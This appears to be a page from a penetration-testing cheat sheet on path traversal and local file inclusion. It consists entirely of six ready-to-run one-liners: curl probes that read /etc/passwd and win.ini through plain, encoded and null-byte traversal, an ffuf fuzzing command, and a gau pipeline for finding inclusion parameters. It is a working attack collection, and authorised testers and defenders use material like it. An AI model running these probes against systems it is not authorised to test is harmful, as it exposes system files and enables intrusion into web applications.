# Path Traversal & LFI

Compact traversal and local-file inclusion probes for common parameter patterns.

<div class="ol-section-kicker"><span>WEB</span><strong>6 one-liners</strong></div>

## Linux traversal probe

```bash
curl -sk "https://<TARGET>/<PATH>?file=../../../../etc/passwd"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, LFI · **Context:** No auth · **Noise:** Moderate

## Encoded traversal probe

```bash
curl -sk "https://<TARGET>/<PATH>?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, encoding · **Context:** No auth · **Noise:** Moderate

## Windows traversal probe

```bash
curl -sk "https://<TARGET>/<PATH>?file=..%5c..%5c..%5cWindows%5cwin.ini"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, traversal, Windows · **Context:** No auth · **Noise:** Moderate

## ffuf traversal payloads

```bash
ffuf -u "https://<TARGET>/<PATH>?file=FUZZ" -w <TRAVERSAL_WORDLIST> -mc all -fs <BASELINE_SIZE>
```

**Tool:** ffuf · **Platform:** Linux · **Tags:** Web, traversal, fuzzing · **Context:** No auth · **Noise:** Moderate

## LFI parameter hunting

```bash
gau <DOMAIN> | grep -Ei "(file|page|path|include|template|document)=" | sort -u
```

**Tool:** gau · **Platform:** Linux · **Tags:** Web, LFI, parameters · **Context:** No auth · **Noise:** Moderate

## Null-byte legacy probe

```bash
curl -sk "https://<TARGET>/<PATH>?file=../../../../etc/passwd%00"
```

**Tool:** curl · **Platform:** Any · **Tags:** Web, LFI, legacy · **Context:** No auth · **Noise:** Moderate

---

**Related:** Parameters · Content Discovery · File Upload
